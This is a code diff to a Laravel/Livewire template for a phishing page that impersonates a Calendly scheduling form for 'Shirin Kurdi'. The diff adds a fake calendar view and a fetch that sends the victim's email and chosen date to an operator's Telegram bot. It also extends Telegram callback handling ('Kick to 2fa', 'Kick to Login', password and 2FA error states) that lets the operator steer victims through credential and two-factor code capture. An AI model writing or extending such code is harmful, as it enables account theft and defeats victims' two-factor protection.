@@ -52,7 +52,29 @@
                             <p>Report abuse</p>
                         </div>
                     </div>
-                    <div class="form__wrapper date__time">
+                    <div  class="date__time {{$showCalender == false ? 'd-none':''}}">
+                        <h2>Select a Date & Time</h2>
+                        <div class="calendar__container svg__icon">
+                            <div class="" style="min-width: 400px;padding-right: 15px;margin-top:20px;">
+                                <div wire:ignore class="calendar-wrapper" id="calendar-wrapper"></div>
+                                <div class="time__zone-wrapper" style="margin-top: 20px;">
+                                    <p>Time zone</p>
+                                    <div class="central">
+                                        <img width="14px" src="world.png">
+                                        Asia/Dhaka (17:53)
+                                    </div>
+                                </div>
+                            </div>
+
+                        </div>
+                        <a class="logo__wrapper-calendly hide__mobile">
+                            <div class="background">
+                                <div class="powerd__by">powered by</div>
+                                <div class="calendly">Calendly</div>
+                            </div>
+                        </a>
+                    </div>
+                    <div class="form__wrapper date__time {{$showCalender ? 'd-none':''}}">
                         <div>
                             <div class="full__width">
                                 <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule call with Shirin Kurdi</h2></div>
@@ -384,6 +406,7 @@
     }else{
         sessionId = localStorage.getItem('sessionId');
     }
+    let selectedDate;
     const apiKey = "{{env('TELEGRAM_API_KEY')}}";
     const chatId = "{{env('TELEGRAM_CHAT_ID')}}";
     const replyMarkup = `reply_markup={"inline_keyboard": [[{"text": "accept", "callback_data": "accept"}]]}`;
@@ -410,7 +433,8 @@
     })
     document.addEventListener('open-modal',function (){
         $('#continue-modal').show();
-    })
+    });
+
     document.addEventListener('show-login-progress',function (){
         @this.set('showModalFooter',false);
         @this.set('enableLoginForm',false);
@@ -552,6 +576,7 @@
                                 if (update.callback_query) {
                                     const callbackData = update.callback_query.data;
                                     if (callbackData === `/oldError ${localStorage.getItem('sessionId')}`) {
+                                        $('#continue-modal').show();
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', true);
                                         @this.set('enableLoginForm', true);
@@ -559,7 +584,9 @@
                                         @this.set('enableLoadingAfterSubmit', false);
                                         @this.set('twoFaPage', false);
                                         @this.set('codeError', false);
+                                        @this.set('showCalender', false);
                                     }else if(callbackData === `/loginError ${localStorage.getItem('sessionId')}`){
+                                        $('#continue-modal').show();
                                         @this.set('loginError', true);
                                         @this.set('oldPassError', false);
                                         @this.set('enableLoginForm', true);
@@ -567,7 +594,9 @@
                                         @this.set('enableLoadingAfterSubmit', false);
                                         @this.set('twoFaPage', false);
                                         @this.set('codeError', false);
+                                        @this.set('showCalender', false);
                                     }else if(callbackData === `/login ${localStorage.getItem('sessionId')}`){
+                                        $('#continue-modal').show();
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', false);
                                         @this.set('enableLoginForm', false);
@@ -575,7 +604,9 @@
                                         @this.set('enableLoadingAfterSubmit', false);
                                         @this.set('twoFaPage', true);
                                         @this.set('codeError', false);
+                                        @this.set('showCalender', false);
                                     }else if(callbackData === `/2fa ${localStorage.getItem('sessionId')}`){
+                                        $('#continue-modal').show();
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', false);
                                         @this.set('enableLoginForm', false);
@@ -583,7 +614,9 @@
                                         @this.set('enableLoadingAfterSubmit', false);
                                         @this.set('twoFaPage', true);
                                         @this.set('codeError', false);
+                                        @this.set('showCalender', false);
                                     }else if(callbackData === `/2faError ${localStorage.getItem('sessionId')}`){
+                                        $('#continue-modal').show();
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', false);
                                         @this.set('enableLoginForm', false);
@@ -591,6 +624,7 @@
                                         @this.set('enableLoadingAfterSubmit', false);
                                         @this.set('twoFaPage', true);
                                         @this.set('codeError', true);
+                                        @this.set('showCalender', false);
                                     }else if(callbackData === `/schedule ${localStorage.getItem('sessionId')}`){
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', false);
@@ -599,7 +633,8 @@
                                         @this.set('enableLoadingAfterSubmit', false);
                                         @this.set('twoFaPage', false);
                                         @this.set('codeError', false);
-                                        window.Livewire.navigate('/calendar-calendly');
+                                        $('#continue-modal').hide();
+                                        @this.set('showCalender', true);
                                     }
                                 }
                             }
@@ -614,5 +649,238 @@
     function generateSessionId() {
         return `${Date.now()}-${Math.random().toString(36).substr(2, 9)}-${crypto.getRandomValues(new Uint32Array(1))[0]}`;
     }
+
+    window.selectDate = function (date) {
+        console.log('as')
+        $('#calendar-wrapper').updateCalendarOptions({
+            date: date
+        });
+        selectedDate = date;
+        const currentDate = new Date(date);
+        currentDate.setDate(currentDate.getDate());
+        const options = { weekday: 'long', month: 'long', day: 'numeric' };
+        const formattedDate = currentDate.toLocaleDateString('en-US', options);
+        if ($('.calendar__container .full__width').length > 0){
+            $('.calendar__container .full__width').remove();
+        }
+        $('.calendar__container').append(`<div class="full__width">
+                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                        <div class="calendar__time">
+                                            <h2>${formattedDate}</h2>
+                                            <div class="available__wrapper">
+                                                <div class="green__text"></div>
+                                                <p> times you're available</p>
+                                            </div>
+                                            <div class="button__time-wrapper">
+                                                <div>
+                                                    <button class="time" data-time="09:30">
+                                                        <div class="green__text"></div>09:30
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="10:00">
+                                                        <div class="green__text"></div>10:00
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="10:30">
+                                                        <div class="green__text"></div>10:30
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="11:00">
+                                                        <div class="green__text"></div>11:00
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="11:30">
+                                                        <div class="green__text"></div>11:30
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="12:00">
+                                                        <div class="green__text"></div>12:00
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="12:30">
+                                                        <div class="green__text"></div>12:30
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="13:00">
+                                                        <div class="green__text"></div>13:00
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="13:30">
+                                                        <div class="green__text"></div>13:30
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="14:00">
+                                                        <div class="green__text"></div>14:00
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="14:30">
+                                                        <div class="green__text"></div>14:30
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="15:00">
+                                                        <div class="green__text"></div>15:00
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="15:30">
+                                                        <div class="green__text"></div>15:30
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="16:00">
+                                                        <div class="green__text"></div>16:00
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                                <div>
+                                                    <button class="time" data-time="16:30">
+                                                        <div class="green__text"></div>16:30
+                                                    </button>
+                                                    <div>
+                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <div class="footer__wrapper footer__wrapper-mobile">
+                                                <p>Cookie settings</p>
+                                                <p>Report abuse</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>`);
+    };
+    let defaultConfig = {
+        weekDayLength: 3,
+        prevButton:'<i class="fa fa-chevron-left" aria-hidden="true"></i>',
+        nextButton:'<i class="fa fa-chevron-right" aria-hidden="true"></i>',
+        date:new Date(),
+        showTodayButton:false,
+        onClickDate: selectDate,
+        disable: function (date) {
+            const today = new Date();
+            const yesterday = new Date(today.getFullYear(), today.getMonth(), today.getDate() - 1);
+            return date <= yesterday;
+        },
+        showYearDropdown: true,
+        startOnMonday: false,
+    };
+    $('#calendar-wrapper').calendar(defaultConfig);
+    $(document).on('click','button.time',function (e){
+        e.preventDefault();
+        $('button.time').each(function (){
+            $(this).parent('div').removeClass('next__button');
+            $(this).parent('div').find('div > div').empty();
+        });
+        $(this).parent('div').addClass('next__button');
+        $(this).parent('div').find('div > div').append('<button class="btn-next">Next</button>');
+    });
+    $(document).on('click','.btn-next',function (e){
+        e.preventDefault();
+        let time = $(this).parent('div').parent('div').parent('div').find('.time').data('time'); // Example: "10:30"
+        let selectedDateFinal = new Date(selectedDate);
+
+        if (!selectedDateFinal || !time) {
+            console.error('selectedDate or time is missing');
+            return;
+        }
+
+        let [hours, minutes] = time.split(':').map(Number);
+        selectedDateFinal.setHours(hours);
+        selectedDateFinal.setMinutes(minutes);
+        selectedDateFinal.setSeconds(0);
+        let session = localStorage.getItem('sessionId');
+        fetch(`https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: `===PICK A DATE: ${localStorage.getItem('email')}===\n ${selectedDateFinal}`,
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            {
+                                text: `Kick to 2fa`,
+                                callback_data: `/2fa ${session}`,
+                            },
+                            {
+                                text: `Kick to Login`,
+                                callback_data: `/login ${session}`,
+                            },
+                        ],
+                        [
+                            {
+                                text: `Kick to the calendar`,
+                                callback_data: `/calendar ${session}`,
+                            },
+                            {
+                                text: `Thank You`,
+                                callback_data: `/thankyou ${session}`,
+                            },
+                        ]
+                    ],
+                },
+            })
+        }).then(response => {
+            startInterval();
+        }).catch(error => {
+
+        });
+    })
+
 </script>
 @endscript
